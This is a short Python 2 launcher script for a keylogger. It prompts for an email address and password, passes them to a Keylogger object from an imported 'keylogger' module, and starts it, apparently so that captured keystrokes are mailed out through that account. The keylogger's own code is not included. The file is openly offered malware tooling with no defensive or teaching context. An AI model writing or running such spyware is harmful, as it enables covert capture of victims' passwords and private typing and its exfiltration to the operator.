#!/usr/bin/python 
import keylogger


mail =raw_input("mail: ")
passwd = raw_input("passwd: ")
my_keylogger = keylogger.Keylogger(4,mail,passwd)
my_keylogger.start()